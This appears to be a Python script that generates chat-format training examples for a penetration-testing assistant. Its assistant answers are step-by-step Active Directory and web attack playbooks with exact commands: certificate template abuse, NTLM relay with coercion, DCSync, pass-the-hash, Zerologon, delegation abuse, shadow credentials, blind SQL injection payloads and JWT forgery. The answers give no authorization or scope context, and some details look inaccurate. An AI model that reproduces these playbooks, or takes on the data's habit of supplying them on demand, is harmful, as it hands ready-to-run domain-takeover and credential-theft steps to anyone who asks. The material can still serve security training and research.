#!/usr/bin/env python3
"""Generate targeted training examples for v24 eval failures."""
import json
from pathlib import Path

SYS = "You are a security assessment AI specializing in penetration testing and red team operations. Provide detailed, technically accurate answers with exact commands and tool usage."

examples = []

def ex(user, assistant):
    examples.append({"messages": [
        {"role": "system", "content": SYS},
        {"role": "user", "content": user},
        {"role": "assistant", "content": assistant}
    ]})

# === ESC1 (san, subject alternative name, enrollee, certipy) ===
ex(
    "What is ESC1 in AD CS and how do you exploit it?",
    """ESC1 is an AD CS misconfiguration where a certificate template allows the enrollee to supply a Subject Alternative Name (SAN) in the certificate request, combined with a client authentication EKU. This lets an attacker request a certificate for any user including Domain Admins.

**Conditions for ESC1:**
- Template has "Supply in the request" for SAN (subject alternative name)
- Manager approval is NOT required
- Template has client authentication / smartcard EKU
- Low-privileged users can enroll

**Exploitation with certipy:**
```bash
# 1. Find vulnerable templates
certipy find -u user@corp.local -p 'Password123' -dc-ip 10.0.0.1 -vulnerable

# 2. Request cert as Domain Admin (enrollee supplies the SAN)
certipy req -u user@corp.local -p 'Password123' -dc-ip 10.0.0.1 \\
  -ca CORP-CA -template VulnerableTemplate \\
  -upn administrator@corp.local

# 3. Authenticate with the cert to get NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

The key vulnerability is that the enrollee supplies the subject alternative name — they can specify any UPN they want, effectively forging identity for any account."""
)

ex(
    "Explain the ESC1 certificate template attack against Active Directory Certificate Services.",
    """ESC1 exploits certificate templates where the enrollee can supply an arbitrary Subject Alternative Name (SAN) in their certificate signing request. Combined with a client authentication Extended Key Usage, this allows identity impersonation.

**Detection:**
```bash
certipy find -u lowpriv@domain.local -p 'Pass123' -vulnerable -dc-ip 192.168.1.10
```
Look for templates with `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag set — this means the enrollee controls the SAN.

**Full ESC1 exploit chain:**
```bash
# Request cert impersonating DA
certipy req -u lowpriv@domain.local -p 'Pass123' \\
  -ca DOMAIN-CA -template ESC1Template \\
  -upn Administrator@domain.local \\
  -dc-ip 192.168.1.10

# Get NT hash via PKINIT
certipy auth -pfx administrator.pfx -domain domain.local -dc-ip 192.168.1.10
# Output: NT hash for pass-the-hash or PTT

# Pass-the-hash
impacket-secretsdump -hashes ':NTHASH' administrator@192.168.1.10
```

The attack succeeds because the CA signs any SAN the enrollee supplies without verifying the subject's identity."""
)

# === ESC4 (template, acl, write, certipy) ===
ex(
    "Explain the ESC4 AD CS vulnerability and provide the exploitation steps.",
    """ESC4 occurs when a low-privileged user has Write access (WriteDACL, WriteOwner, or Write Property) over a certificate template object in Active Directory. This allows the attacker to modify the template's settings to introduce ESC1-type vulnerabilities.

**How it works:**
1. Attacker has write/owner rights over a template ACL
2. Modify the template to enable enrollee-supplied SAN
3. Exploit it as ESC1

**Exploitation with certipy:**
```bash
# 1. Find templates where you have write access
certipy find -u user@corp.local -p 'Pass123' -dc-ip 10.0.0.1 -vulnerable

# 2. Shadow the template (saves original, applies ESC1 misconfig)
certipy template -u user@corp.local -p 'Pass123' -dc-ip 10.0.0.1 \\
  -template VulnerableTemplate -save-old

# 3. Request cert as DA (now ESC1 exploit)
certipy req -u user@corp.local -p 'Pass123' -dc-ip 10.0.0.1 \\
  -ca CORP-CA -template VulnerableTemplate \\
  -upn administrator@corp.local

# 4. Restore original template ACL/config
certipy template -u user@corp.local -p 'Pass123' -dc-ip 10.0.0.1 \\
  -template VulnerableTemplate -configuration orig.json

# 5. Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

The ACL write permission on the template object is the root cause — if Domain Users have Write rights, any authenticated user can reconfigure the template."""
)

ex(
    "How do I abuse write permissions on an AD CS certificate template (ESC4)?",
    """ESC4 abuse relies on having Write, WriteDACL, or WriteOwner permissions on a certificate template's ACL in Active Directory. You modify the template settings to make it vulnerable to ESC1 (enrollee-supplied SAN).

**Check template ACL with certipy:**
```bash
certipy find -u attacker@corp.local -p 'P@ss123' -vulnerable -text
# Look for: "Client Access Rights" showing Write/FullControl for low-priv groups
```

**Exploitation steps:**
```bash
# Modify template to allow SAN supply (enabling ESC1)
certipy template -u attacker@corp.local -p 'P@ss123' \\
  -template "TargetTemplate" -save-old -dc-ip 10.10.0.1

# Now request cert with admin UPN
certipy req -u attacker@corp.local -p 'P@ss123' \\
  -ca 'CORP\CORP-CA' -template TargetTemplate \\
  -upn Administrator@corp.local -dc-ip 10.10.0.1

# Authenticate and retrieve NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.1
```

The template acl write access is what makes ESC4 possible — it gives you indirect control over who can enroll and with what parameters."""
)

# === ESC6 (san, editf_attributesubjectaltname2, flag) ===
ex(
    "What is ESC6 and why was it partially mitigated by Microsoft?",
    """ESC6 occurs when the Certificate Authority (CA) itself has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled. This flag tells the CA to accept SANs (Subject Alternative Names) from all certificate requests — even templates that don't normally allow it.

**Impact:** Any template with client auth EKU becomes vulnerable, even without the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT bit set on the template.

**Detection:**
```bash
# Check CA for the flag
certipy find -u user@corp.local -p 'Pass' -dc-ip 10.0.0.1
# Look for: "User Specified SAN: Enabled" or EDITF_ATTRIBUTESUBJECTALTNAME2

certutil -getreg ca\policy\EditFlags
# Look for: EDITF_ATTRIBUTESUBJECTALTNAME2 in the output
```

**Exploitation:**
```bash
certipy req -u user@corp.local -p 'Pass' \\
  -ca CORP-CA -template User \\
  -upn administrator@corp.local -dc-ip 10.0.0.1

certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

**Microsoft Mitigation (KB5014754):** Microsoft patched this in May 2022 by requiring a SAN extension OID (SZ_ID_EXTENSION_SZOID) to be explicitly requested — the CA no longer blindly accepts arbitrary SANs from the request. However, the flag (EDITF_ATTRIBUTESUBJECTALTNAME2) can still be re-enabled by admins, making it a persistent risk."""
)

ex(
    "Describe the ESC6 AD CS attack and how the CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 is abused.",
    """ESC6 is a CA-level misconfiguration where the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is set on the Certification Authority. This flag causes the CA to honor Subject Alternative Name (SAN) attributes in ALL certificate requests, regardless of what individual certificate templates allow.

**Why it's dangerous:** Even a basic "User" template with no special settings becomes exploitable because the CA flag overrides template restrictions — the SAN is accepted at the CA level.

**Identify vulnerable CAs:**
```bash
# Method 1: certipy find checks for this flag automatically
certipy find -u low@corp.local -p 'P@ss' -dc-ip 10.0.0.1 -vulnerable

# Method 2: certutil on Windows
certutil -getreg policy\EditFlags | findstr EDITF
```

**Exploit:**
```bash
# Request any template, supply SAN for DA
certipy req -u low@corp.local -p 'P@ss' -ca 'CORP-CA' \\
  -template User -upn administrator@corp.local -dc-ip 10.0.0.1

certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

Microsoft's partial mitigation removed the default honor of this flag on newer DCs but it remains a finding when explicitly enabled by admins."""
)

# === ESC8 (enrollment endpoint, coerce, ntlm relay, certipy relay) ===
ex(
    "What is ESC8 and how do you exploit it with NTLM relay?",
    """ESC8 abuses the AD CS HTTP enrollment endpoint (certsrv) which supports NTLM authentication. An attacker relays NTLM authentication from a coerced machine account to the HTTP certsrv endpoint to obtain a certificate for that machine.

**Prerequisites:**
- AD CS HTTP enrollment endpoint exposed (not HTTPS — NTLM relay requires HTTP)
- Ability to coerce authentication (PetitPotam, PrinterBug, etc.)

**Exploitation:**
```bash
# 1. Start ntlmrelayx targeting the HTTP certsrv endpoint
impacket-ntlmrelayx -t http://CA-SERVER/certsrv/certfnsh.asp \\
  --adcs --template DomainController -smb2support

# 2. Coerce DC authentication (triggers NTLM auth from DC$)
python3 PetitPotam.py -u '' -p '' ATTACKER-IP DC-IP

# 3. ntlmrelayx relays the NTLM auth → gets DC cert (.pfx)
# Output: Cert saved as base64

# 4. Convert base64 cert to .pfx and authenticate
certipy auth -pfx dc.pfx -dc-ip 10.0.0.1
# Gets DC$ NT hash → DCSync for domain takeover
```

The HTTP enrollment endpoint lacks relay protections (no EPA/channel binding by default), making it the ideal target for NTLM relay."""
)

ex(
    "Walk me through the ESC8 NTLM relay to AD CS attack with exact commands.",
    """ESC8 exploits the HTTP certsrv enrollment endpoint by relaying coerced NTLM authentication. Since the enrollment endpoint uses plain HTTP NTLM (no EPA by default), relay attacks work.

**Attack flow:**
```bash
# Terminal 1: Start relay to ADCS HTTP enrollment
impacket-ntlmrelayx \\
  -t http://ADCS-SERVER/certsrv/certfnsh.asp \\
  --adcs --template DomainController \\
  -smb2support --no-http-server

# Terminal 2: Coerce DC to authenticate to you
# Option A: PetitPotam (unauthenticated if MS patch not applied)
python3 PetitPotam.py -u '' -p '' YOUR-IP DC-IP

# Option B: PrinterBug
python3 printerbug.py domain/user:pass@DC-IP YOUR-IP

# ntlmrelayx intercepts → relays to certsrv → gets DomainController cert
# Output: [*] Certificate saved to 'DC$.pfx'

# Step 3: Authenticate via PKINIT to get NT hash
certipy auth -pfx 'DC$.pfx' -dc-ip DC-IP -domain corp.local

# Step 4: DCSync with DC$ NT hash
impacket-secretsdump -hashes ':NTHASH' 'corp.local/DC$@DC-IP'
```

**Key requirement:** The enrollment endpoint must use HTTP (not HTTPS) — NTLM relay doesn't work over HTTPS because TLS breaks the relay chain."""
)

# === ESC8-commands (certipy auth, pfx) ===
ex(
    "After obtaining a certificate via ESC8 NTLM relay, what are the exact commands to authenticate and get domain admin access?",
    """After ntlmrelayx delivers the base64 certificate from the certsrv relay:

```bash
# 1. ntlmrelayx outputs base64 cert — save it or it auto-saves as DC$.pfx

# 2. Authenticate with certipy auth to get NT hash via PKINIT
certipy auth -pfx DC$.pfx -dc-ip 10.0.0.1 -domain corp.local
# Output: [*] Got hash for 'dc$@corp.local': aad3b435b51404eeaad3b435b51404ee:NTHASHHERE

# 3. DCSync using the DC machine account NT hash
impacket-secretsdump -hashes ':NTHASH' 'corp.local/DC$@10.0.0.1' -just-dc

# 4. Use krbtgt hash for golden ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... \\
  -domain corp.local Administrator

# Alternative: Pass-the-hash with admin hash
impacket-wmiexec -hashes ':ADMIN_NTHASH' administrator@10.0.0.1
```

The .pfx file from certipy contains the certificate + private key needed for PKINIT authentication. certipy auth converts it to an NT hash via U2U Kerberos."""
)

# === ASREPRoast (pre-authentication, GetNPUsers, 23100) ===
ex(
    "How does AS-REP roasting differ from Kerberoasting? Provide exploitation commands.",
    """**Key difference:**
- **Kerberoasting**: Targets accounts with SPNs; requires a valid TGT (authenticated); cracks TGS-REP (hashcat mode -m 13100)
- **AS-REP Roasting**: Targets accounts with pre-authentication DISABLED; works UNAUTHENTICATED; cracks AS-REP (hashcat mode -m 23100)

**AS-REP Roasting** exploits the Kerberos AS exchange — when pre-authentication is disabled, the KDC returns an AS-REP without verifying identity, and the reply contains encrypted data crackable offline.

**Exploitation:**
```bash
# Unauthenticated (no creds needed — userlist from OSINT/enumeration)
impacket-GetNPUsers -dc-ip 10.0.0.1 -no-pass -usersfile users.txt corp.local/

# Authenticated (finds all vulnerable accounts automatically)
impacket-GetNPUsers -dc-ip 10.0.0.1 -request corp.local/user:Password123

# Output: $krb5asrep$23$victim@CORP.LOCAL:...<hash>

# Crack the AS-REP hash
hashcat -m 23100 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
# Note: mode 23100 is for AS-REP (vs 13100 for TGS/kerberoast)
```

**Key distinction**: AS-REP roasting doesn't require a TGS ticket — it operates on the initial authentication request. Accounts must have "Do not require Kerberos preauthentication" enabled (DONT_REQUIRE_PREAUTH flag)."""
)

ex(
    "What is AS-REP roasting and how do you find and crack AS-REP hashes?",
    """AS-REP roasting targets Active Directory accounts that have Kerberos pre-authentication disabled (DONT_REQUIRE_PREAUTH flag set). Without pre-authentication, the KDC will return an AS-REP containing encrypted data for ANY request — no valid credentials needed.

**Find vulnerable accounts:**
```bash
# No credentials required
impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.1 -no-pass -usersfile users.txt -format hashcat

# With credentials (enumerates all without pre-auth)
impacket-GetNPUsers corp.local/lowpriv:Password1 -dc-ip 10.10.10.1 -request -format hashcat

# With netexec
netexec ldap DC -u user -p pass --asreproast asrep.txt
```

**Hash format and cracking:**
```bash
# AS-REP hashes start with: $krb5asrep$23$
hashcat -m 23100 -a 0 asrep.txt rockyou.txt --force
# Mode 23100 = Kerberos 5, etype 23, AS-REP

# John
john --format=krb5asrep asrep.txt --wordlist=rockyou.txt
```

**Difference from Kerberoasting:**
- Kerberoasting: needs auth → requests TGS → mode 13100
- AS-REP roasting: no pre-authentication required → mode 23100, no TGS ticket involved""" 
)

# === PTH (pth, wmiexec, secretsdump, lm:nt) ===
ex(
    "How does Pass-the-Hash work? Give exact commands for lateral movement.",
    """Pass-the-Hash (PtH) exploits NTLM authentication — instead of providing a plaintext password, you supply the NT hash directly. Windows NTLM auth uses the hash as the credential, so no need to crack it.

**NTLM hash format:** `LM:NT` (e.g., `aad3b435b51404eeaad3b435b51404ee:NTHASHHERE`)
- LM part is typically `aad3b435b51404eeaad3b435b51404ee` (empty password hash) on modern systems
- NT hash is the actual credential

**Lateral movement with PTH:**
```bash
# Remote code execution
impacket-wmiexec -hashes 'aad3b435b51404eeaad3b435b51404ee:NTHASH' \\
  administrator@10.0.0.5

impacket-psexec -hashes ':NTHASH' administrator@10.0.0.5

# Dump credentials from remote machine
impacket-secretsdump -hashes ':NTHASH' administrator@10.0.0.5

# SMB access
netexec smb 10.0.0.5 -u administrator -H 'NTHASH' --shares

# Interactive shell
evil-winrm -i 10.0.0.5 -u administrator -H NTHASH
```

**Extract hashes (prerequisite):**
```bash
# From lsass (local admin needed)
impacket-secretsdump -hashes ':NTHASH' administrator@DC-IP

# Mimikatz on Windows
sekurlsa::logonpasswords
lsadump::sam
```

PTH works because NTLM challenge-response uses the hash directly — the protocol never transmits the plaintext password."""
)

ex(
    "Explain Pass-the-Hash lateral movement with impacket tools.",
    """Pass-the-Hash (PtH) abuses NTLM protocol by using the NT hash directly as authentication credential. The lm:nt format (LM:NT hash pair) is accepted by all NTLM-based services.

**Hash format:** `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0`
- Left of colon: LM hash (usually empty/null on modern systems)
- Right of colon: NT hash (the actual secret)

**PtH lateral movement commands:**
```bash
# WMI execution
impacket-wmiexec corp.local/Administrator@192.168.1.10 \\
  -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH

# SMB/psexec
impacket-psexec -hashes ':NTHASH' corp/administrator@192.168.1.10

# Dump SAM/NTDS from remote via secretsdump
impacket-secretsdump -hashes ':NTHASH' \\
  corp.local/administrator@192.168.1.10

# Enumerate and spray hashes
netexec smb 192.168.1.0/24 -u administrator -H NTHASH

# WinRM
evil-winrm -i 192.168.1.10 -u administrator -H NTHASH
```

Note: PtH does NOT require plaintext password — only works against NTLM-based auth (not Kerberos-only setups)."""
)

# === BloodHound (bloodhound, neo4j, acl, paths) ===
ex(
    "How do you run BloodHound/SharpHound for AD enumeration? What data does it collect?",
    """BloodHound uses graph-based analysis to map Active Directory attack paths. SharpHound is the data collector; BloodHound is the Neo4j-backed visualization tool.

**Data collection with SharpHound:**
```bash
# Linux (Python-based collector)
bloodhound-python -u user -p 'Pass123' -d corp.local \\
  -dc 10.0.0.1 -c All --zip

# Windows SharpHound
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Common collection methods:
-c Default    # Sessions, LocalAdmins, Groups, Trusts, ACLs
-c All        # All of the above + containers, GPOs, DcOnly
-c Session    # Active sessions only (stealthier)
```

**What it collects:**
- User/computer/group memberships
- ACLs (Access Control Lists) — who has Write, GenericAll, GenericWrite on objects
- Active sessions — where users are logged in
- Local admin relationships
- Trust relationships between domains
- Shortest attack paths to Domain Admin

**Run BloodHound:**
```bash
# Start Neo4j
sudo neo4j start    # default: http://localhost:7474, bolt://localhost:7687

# Launch BloodHound GUI
bloodhound

# Import zip file → drag-and-drop or File > Import Data
```

**Key queries:**
- "Shortest Paths to Domain Admins" — shows ACL/delegation paths
- "Find all Domain Admins" 
- "Users with DCSync Rights"
- "Computers with Unconstrained Delegation"

BloodHound's value is in revealing indirect privilege escalation paths via ACL abuse that manual enumeration misses."""
)

# === certipy-find (-vulnerable, -u, -p, enabled) ===
ex(
    "What exact certipy command finds vulnerable certificate templates and what output should I look for?",
    """```bash
# Basic vulnerability scan — finds templates vulnerable to ESC1-15
certipy find -u user@corp.local -p 'Password123' -dc-ip 10.0.0.1 -vulnerable

# Save to text file for review
certipy find -u user@corp.local -p 'Password123' -dc-ip 10.0.0.1 -vulnerable -text

# Save as JSON for parsing
certipy find -u user@corp.local -p 'Password123' -dc-ip 10.0.0.1 -vulnerable -json

# Full scan (all templates, not just vulnerable)
certipy find -u user@corp.local -p 'Password123' -dc-ip 10.0.0.1
```

**Flags:**
- `-u` : username (user@domain.local format)
- `-p` : password
- `-vulnerable` : filter to only show exploitable templates
- `-dc-ip` : domain controller IP

**Output to look for:**
```
Certificate Templates
  0
    Template Name              : VulnTemplate
    Display Name               : VulnTemplate
    Enabled                    : True          ← must be enabled
    Client Authentication      : True
    Enrollee Supplies Subject  : True          ← ESC1 flag
    ...
    [!] Vulnerabilities
      ESC1                     : 'CORP\\Domain Users' can enroll...
```

Key fields:
- `Enabled: True` — template must be enabled on CA
- `Enrollee Supplies Subject: True` → ESC1
- `[!] Vulnerabilities` section lists all ESC types found
- `-u` and `-p` provide the authenticated context for ACL evaluation"""
)

# === DCSync (secretsdump, replication, ds-replication-get-changes, ntlm hash) ===
ex(
    "How does DCSync work and what permissions are needed?",
    """DCSync mimics the behavior of a Domain Controller requesting replication of password hashes. Instead of logging into the DC, you abuse AD replication rights to pull NTLM hashes remotely.

**Required permissions (any of these):**
- Domain Admins or Enterprise Admins
- `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` rights on the domain object
- `DS-Replication-Get-Changes-In-Filtered-Set` (for protected users)

Note: Does NOT require domain admin by default — any account granted the replication rights can DCSync.

**DCSync with impacket-secretsdump:**
```bash
# Dump all hashes from DC (full DCSync)
impacket-secretsdump -just-dc corp.local/admin:Password123@10.0.0.1

# DCSync for specific account only
impacket-secretsdump -just-dc-user krbtgt corp.local/admin:Password123@10.0.0.1

# Using NT hash (if already PtH)
impacket-secretsdump -just-dc -hashes ':NTHASH' corp.local/admin@10.0.0.1
```

**DCSync with Mimikatz (on Windows):**
```
lsadump::dcsync /domain:corp.local /all /csv
lsadump::dcsync /domain:corp.local /user:krbtgt
```

**Output:** NTLM hashes for all accounts including krbtgt (golden ticket) and all DA accounts.

**Detection:** DCSync generates replication events (Event ID 4662) — look for non-DC machines initiating replication with DS-Replication-Get-Changes permissions."""
)

# === Zerologon (cve-2020-1472, netlogon, domain controller, machine account password) ===
ex(
    "What does Zerologon (CVE-2020-1472) allow an attacker to do and how does it work?",
    """Zerologon (CVE-2020-1472) is a critical vulnerability in the Netlogon Remote Protocol (MS-NRPC) that allows an unauthenticated attacker to set the machine account password of a domain controller to an empty string, leading to full domain compromise.

**How it works:**
The Netlogon protocol uses AES-CFB8 encryption with an initialization vector (IV) of all zeros. By sending 256 authentication attempts with a plaintext of all zeros, the attacker has a 1-in-256 chance each time of the ciphertext also being all zeros (due to the IV collision). This allows bypassing authentication and calling `NetrServerPasswordSet2` to reset the DC machine account password.

**Impact:**
- Reset the domain controller machine account password to empty
- Authenticate as the DC machine account
- Perform DCSync to dump all domain credentials (krbtgt, DA hashes)
- Full domain takeover from the network (no prior credentials needed)

**Exploitation:**
```bash
# 1. Exploit zerologon — set DC$ password to empty
python3 zerologon_tester.py DC-NETBIOS-NAME DC-IP

# If vulnerable, exploit:
python3 set_empty_pw.py DC-NETBIOS-NAME DC-IP

# 2. DCSync using empty DC machine account password
impacket-secretsdump -no-pass 'corp.local/DC$@DC-IP'

# 3. Restore DC password (CRITICAL — don't leave it empty)
impacket-secretsdump output gives original machine pw hash
```

**Patch:** MS20-049 (August 2020) — updated Netlogon to require secure channel encryption, blocking the IV manipulation."""
)

# === PTH/Kerberos confusion ===
ex(
    "ESC8 only works if the HTTP enrollment endpoint is enabled. We have HTTPS only. Are we still vulnerable?",
    """No — if only HTTPS is enabled for the enrollment endpoint, the server is NOT vulnerable to ESC8 via NTLM relay.

**Why HTTP is required for ESC8:**
ESC8 works by relaying NTLM authentication from a coerced victim to the certsrv HTTP enrollment page. NTLM relay is blocked by HTTPS because:
- TLS establishes a direct channel between client and server
- The relay attacker cannot intercept/inject into a TLS session
- Extended Protection for Authentication (EPA) / channel binding on HTTPS breaks relay

**HTTP required for NTLM relay to certsrv:**
- `http://CA-SERVER/certsrv/certfnsh.asp` ← vulnerable to relay
- `https://CA-SERVER/certsrv/certfnsh.asp` ← not vulnerable to relay (ntlm relay fails)

**If only HTTPS is exposed:**
- ESC8 via NTLM relay is NOT exploitable
- Other ESC variants (ESC1-7) on the certificate templates may still apply
- Check `certipy find -vulnerable` for other misconfigurations

**Summary:** HTTPS is the mitigation for ESC8 relay attacks. The server is not vulnerable to ESC8 if HTTP enrollment is not exposed."""
)

# === SQLi boolean blind ===
ex(
    "How do you manually exploit boolean-based blind SQL injection without sqlmap?",
    """Boolean-based blind SQLi works by crafting queries that return different responses (true/false) — you infer data one bit at a time based on the application's behavior.

**Core concept:**
- `' AND 1=1--` → true condition → normal response
- `' AND 1=2--` → false condition → different/empty response

**Technique:**
```
# Test boolean condition
?id=1' AND 1=1--    → normal page
?id=1' AND 1=2--    → error/empty = injectable

# Extract database version character by character
?id=1' AND SUBSTRING(version(),1,1)='5'--   → true/false
?id=1' AND ASCII(SUBSTRING(version(),1,1))>50--

# Binary search approach (faster)
?id=1' AND ASCII(SUBSTRING(database(),1,1))>64--
?id=1' AND ASCII(SUBSTRING(database(),1,1))>96--
```

**Time-based blind (when no visual difference):**
```sql
-- MySQL
?id=1' AND SLEEP(5)--
?id=1'; IF(1=1, SLEEP(5), 0)--

-- MSSQL
?id=1'; IF(1=1) WAITFOR DELAY '0:0:5'--

-- Extract with time-based
?id=1' AND IF(SUBSTRING(user(),1,1)='r', SLEEP(5), 0)--
```

**Automate substring extraction:**
```python
import requests, string
result = ""
for pos in range(1, 50):
    for char in string.printable:
        payload = f"1' AND SUBSTRING(user(),{pos},1)='{char}'-- -"
        r = requests.get(url, params={'id': payload})
        if "Welcome" in r.text:  # true condition marker
            result += char
            break
```

The key identifiers: boolean (true/false conditions), substring (char-by-char extraction), sleep (time-based oracle)."""
)

# === JWT (hs256, rs256, hashcat, base64) ===
ex(
    "How do you exploit JWT vulnerabilities including alg:none and key confusion?",
    """JWTs consist of three base64url-encoded parts: `header.payload.signature`

**Vulnerability 1: Algorithm None**
```python
# JWT with alg:none — no signature verification
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b'=')
# Empty signature
token = f"{header.decode()}.{payload.decode()}."
```

**Vulnerability 2: HS256/RS256 Key Confusion**
If server uses RS256 (asymmetric, public key verifies), but accepts HS256:
```bash
# Sign with the server's PUBLIC RSA key as HMAC-SHA256 secret
# The server uses public key to verify HS256 → matches!

# Tools:
python3 jwt_tool.py TOKEN -X k -pk public.pem  # jwt_tool
```

**Vulnerability 3: Weak HMAC secret (HS256)**
```bash
# Crack HS256 secret with hashcat
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# JWT format for hashcat (mode 16500):
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.SIGNATURE

# Decode any JWT (base64):
echo "eyJzdWIiOiJ1c2VyIn0" | base64 -d
```

**Exploitation flow:**
1. Capture JWT from browser/proxy
2. Decode with `base64 -d` or jwt.io
3. Test `alg: none` — remove signature, change claims
4. If HS256, crack with hashcat -m 16500 or try RS256 confusion
5. Forge new token with modified claims (e.g., `"admin": true`)"""
)

# === delegation-unconstrained (tgt, coerce, NOT constrained) ===
ex(
    "What is unconstrained Kerberos delegation and how is it abused?",
    """Unconstrained delegation allows a service account or computer to impersonate any authenticating user to ANY service in the domain. When a user authenticates to a host with unconstrained delegation, their TGT (Ticket Granting Ticket) is stored in memory on that host.

**How TGT capture works:**
1. Victim authenticates to the delegating host (DC, web server, etc.)
2. The host stores the victim's TGT in LSASS memory
3. Attacker with admin on that host extracts the TGT
4. TGT used to authenticate as the victim to any service

**Abuse with printer bug / PetitPotam coerce:**
```bash
# 1. Find hosts with unconstrained delegation
impacket-findDelegation corp.local/user:pass -dc-ip 10.0.0.1
netexec ldap DC -u user -p pass --trusted-for-delegation

# 2. Get admin on the delegating host (or already have it)
# 3. Monitor for TGTs using Rubeus
.\Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC$

# 4. Coerce DC authentication to our delegating host
python3 PetitPotam.py DELEGATING-HOST DC-IP

# 5. Rubeus captures DC$ TGT → extract and pass-the-ticket
.\Rubeus.exe ptt /ticket:BASE64_TGT

# 6. DCSync or access DC resources as DC$
impacket-secretsdump -k -no-pass corp.local/DC$@DC-IP
```

Key difference from constrained delegation: unconstrained stores the actual TGT (not a service ticket), allowing full impersonation to any service. Constrained delegation only allows specific SPNs."""
)

# === RBCD (s4u2self, s4u2proxy, computer account) ===
ex(
    "Explain Resource-Based Constrained Delegation (RBCD) abuse when you have write access to a computer object.",
    """RBCD abuse exploits the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on a target computer object. If you can write this attribute, you can make the target trust your controlled computer account to impersonate any user.

**Attack flow:**

**Prerequisites:** WriteProperty / GenericWrite on the target computer object in AD.

```bash
# Step 1: Create or find a computer account you control
# Option A: Create a new machine account (default: any authenticated user can add up to 10)
impacket-addcomputer corp.local/user:pass -dc-ip 10.0.0.1 -computer-name ATTACKER$ -computer-pass 'P@ss123'

# Step 2: Set msDS-AllowedToActOnBehalfOfOtherIdentity on target computer
# Point it to our ATTACKER$ machine account
impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' \\
  -action write corp.local/user:pass -dc-ip 10.0.0.1

# Step 3: Use S4U2Self to get a service ticket on behalf of Administrator
impacket-getST -spn cifs/TARGET.corp.local \\
  -impersonate Administrator \\
  -dc-ip 10.0.0.1 'corp.local/ATTACKER$:P@ss123'

# S4U2Self: our machine requests TGS on behalf of victim (no victim interaction)
# S4U2Proxy: exchange self-ticket for service ticket to target (requires RBCD config)

# Step 4: Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass corp.local/Administrator@TARGET.corp.local
```

**Key mechanics:** S4U2Self + S4U2Proxy chain → RBCD requires a computer account with an SPN to complete the delegation. The msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the target is what makes the DC authorize the delegation."""
)

# === Shadow credentials (certipy, pkinit, nt hash) ===
ex(
    "What are Shadow Credentials and how do you abuse WriteMSDS-KeyCredentialLink?",
    """Shadow Credentials abuse the `msDS-KeyCredentialLink` attribute on AD user/computer objects. This attribute stores public key credentials for PKINIT (Certificate-based Kerberos auth). If you can write this attribute, you add your own key pair and then authenticate as that account using PKINIT to get their NT hash.

**Requirements:**
- WriteProperty / GenericWrite on the target object's `msDS-KeyCredentialLink` attribute
- AD CS is NOT required — this uses raw PKINIT, not certificate templates

**Exploitation with certipy:**
```bash
# 1. Add shadow credentials (our public key) to target object
certipy shadow auto -u attacker@corp.local -p 'Pass123' \\
  -account targetuser -dc-ip 10.0.0.1
# Saves: targetuser.pfx (contains key pair)

# 2. Authenticate via PKINIT using our .pfx → get NT hash
certipy auth -pfx targetuser.pfx -dc-ip 10.0.0.1
# Output: [*] Got hash for 'targetuser@corp.local': aad3...:NTHASH

# 3. Pass-the-hash with recovered NT hash
impacket-wmiexec -hashes ':NTHASH' corp.local/targetuser@10.0.0.1
```

**Manual steps:**
```bash
# Add key credential using pywhisker
python3 pywhisker.py -d corp.local -u attacker -p 'Pass123' \\
  --target targetuser --action add --dc-ip 10.0.0.1

# Authenticate with generated .pfx via PKINIT
certipy auth -pfx targetuser_DEVICEID.pfx -dc-ip 10.0.0.1
```

Shadow credentials are stealthy — they leave no certificate on the CA and use PKINIT authentication to recover the NT hash directly."""
)

# === pkinit-auth (certipy auth, pfx, pkinit, nt hash, tgt) ===
ex(
    "After obtaining a certificate .pfx from certipy, how do you authenticate with it?",
    """Once you have a `.pfx` file (PKCS12 containing certificate + private key) from certipy, use `certipy auth` to authenticate via PKINIT and retrieve the NT hash:

```bash
# Basic authentication
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1

# Specify domain if needed
certipy auth -pfx administrator.pfx -domain corp.local -dc-ip 10.0.0.1

# Output:
# [*] Using principal: administrator@corp.local
# [*] Trying to get TGT...
# [*] Got TGT (saved to administrator.ccache)
# [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:NTHASHHERE
```

**What happens internally:**
1. `certipy auth` uses the .pfx certificate + key for PKINIT (RFC 4556) authentication
2. The KDC verifies the cert → issues a TGT
3. certipy performs U2U (User-to-User) Kerberos exchange to extract the NT hash from the TGT
4. You get both: a TGT (.ccache) AND the NT hash

**Using the results:**
```bash
# Pass-the-hash lateral movement
impacket-wmiexec -hashes ':NTHASH' administrator@10.0.0.1

# Use the TGT directly (Kerberos ticket)
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass administrator@corp-dc.corp.local

# PtH for secretsdump
impacket-secretsdump -hashes ':NTHASH' corp.local/administrator@10.0.0.1
```

The .pfx is the key artifact — it enables PKINIT which gives TGT + NT hash extraction."""
)

